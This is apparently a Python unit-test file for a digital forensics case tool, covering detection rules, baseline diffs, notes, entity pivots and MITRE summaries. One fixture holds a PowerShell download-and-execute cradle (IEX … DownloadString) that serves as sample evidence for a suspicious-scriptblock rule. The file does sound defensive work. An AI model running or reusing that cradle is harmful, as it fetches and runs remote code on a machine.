from __future__ import annotations

import shutil
import tempfile
import unittest
from datetime import datetime, timezone
from pathlib import Path

from analysis.analysis_service import AnalysisService
from analysis.correlation import correlators_for_profile
from analysis.detection import RuleEngine
from analysis.investigation.baseline import BaselineComparer
from analysis.investigation.checklist import ChecklistService
from analysis.investigation.entities import build_entity_index, pivot_entities
from analysis.investigation.notes_service import NotesService
from case_management.case_service import CaseService
from common.enums import ArtifactType
from models.normalized_record import NormalizedRecord

PROJECT_ROOT = Path(__file__).resolve().parents[2]


class InvestigationTests(unittest.TestCase):
    def setUp(self) -> None:
        temporary_directory = tempfile.TemporaryDirectory()
        self.temp_path = Path(temporary_directory.name)
        self.addCleanup(temporary_directory.cleanup)
        shutil.copytree(PROJECT_ROOT / "config", self.temp_path / "config")
        self.service = CaseService(self.temp_path, actor="analyst")
        self.case = self.service.create_case(
            title="Investigation extras",
            target_hostname="WIN-LAB01",
            profile_id="general_investigation",
        )

    def record(self, **overrides) -> NormalizedRecord:
        values = {
            "case_id": self.case.case_id,
            "source_type": "evtxecmd_event",
            "artifact_type": ArtifactType.EVENT_LOGS,
            "timestamp": datetime(2026, 7, 29, 8, tzinfo=timezone.utc),
            "summary": "lab event",
            "hostname": "WIN-LAB01",
            "raw_reference": "analysis/tool_outputs/source.csv",
        }
        values.update(overrides)
        return NormalizedRecord(**values)

    def test_correlation_profile_limits_account_case(self) -> None:
        correlators = correlators_for_profile("account_compromise")
        self.assertEqual(len(correlators), 1)
        self.assertEqual(
            type(correlators[0]).__name__,
            "AccountCompromiseCorrelation",
        )

    def test_new_contextual_rules_fire_only_on_matching_evidence(self) -> None:
        engine = RuleEngine(self.temp_path)
        shutdown = self.record(
            event_id=1100,
            record_id="REC-1100",
            summary="The Event log service was shutdown",
        )
        scriptblock = self.record(
            event_id=4104,
            record_id="REC-4104",
            summary="ScriptBlock DownloadString invoked",
            attributes={"ScriptBlockText": "IEX (New-Object Net.WebClient).DownloadString('http://lab')"},
        )
        file_change = self.record(
            artifact_type=ArtifactType.FILES,
            source_type="file",
            record_id="REC-FILE",
            file_path=r"C:\Lab\data.txt",
            summary="Tracked file hash changed",
            attributes={
                "sha256_before": "a" * 64,
                "sha256_after": "b" * 64,
            },
        )
        probe = self.record(
            artifact_type=ArtifactType.SERVICES,
            source_type="live_service",
            record_id="REC-PROBE",
            summary="Service probe failed",
            attributes={
                "ServiceName": "CrowEyeLabService",
                "probe_status": "timeout",
            },
        )
        alerts = engine.evaluate((shutdown, scriptblock, file_change, probe))
        self.assertEqual(
            {alert.rule_id for alert in alerts},
            {
                "event_log_service_shutdown",
                "powershell_scriptblock_suspicious",
                "file_integrity_change",
                "service_probe_failed",
            },
        )

    def test_authorized_service_stop_is_not_alerted(self) -> None:
        record = self.record(
            event_id=7036,
            record_id="REC-MAINT",
            summary="LabService entered the stopped state",
            attributes={
                "ServiceName": "LabService",
                "State": "stopped",
                "authorized": True,
            },
        )
        rule = RuleEngine(self.temp_path).get("service_stopped")
        self.assertEqual(rule.evaluate((record,)), ())

    def test_baseline_notes_and_story(self) -> None:
        record = self.record(
            artifact_type=ArtifactType.FILES,
            source_type="file",
            record_id="REC-HASH",
            file_path=r"C:\Lab\secret.txt",
            attributes={
                "hash_before": "1" * 64,
                "hash_after": "2" * 64,
            },
        )
        diff = BaselineComparer(self.temp_path).compare(
            self.case.case_id,
            (record,),
        )
        self.assertEqual(diff.change_count, 1)
        notes = NotesService(self.temp_path).add(
            self.case.case_id,
            "Cần đối chiếu hash file secret.txt",
        )
        self.assertEqual(len(notes), 1)
        checklist = ChecklistService(self.temp_path).load(self.case.case_id)
        self.assertTrue(checklist["items"])

    def test_entity_pivot_and_mitre_summary(self) -> None:
        records = (
            self.record(
                record_id="REC-A",
                user="alice",
                source_ip="203.0.113.10",
                process_name="powershell.exe",
            ),
            self.record(
                record_id="REC-B",
                user="bob",
                source_ip="198.51.100.8",
                process_name="cmd.exe",
            ),
        )
        index = build_entity_index(records)
        self.assertIn("alice", index.users)
        matched = pivot_entities(records, entity_type="user", value="alice")
        self.assertEqual([item.record_id for item in matched], ["REC-A"])

    def test_analysis_persists_story_and_mitre(self) -> None:
        records = (
            self.record(
                event_id=1102,
                record_id="REC-CLEAR",
                summary="The audit log was cleared",
                user="alice",
            ),
        )
        AnalysisService(self.temp_path).analyze(
            case_id=self.case.case_id,
            records=records,
            persist=True,
        )
        paths = self.service.repository.paths(self.case.case_id)
        self.assertTrue(paths.story_json.is_file())
        self.assertTrue(paths.mitre_summary_json.is_file())
        self.assertTrue(paths.baseline_diff_json.is_file())
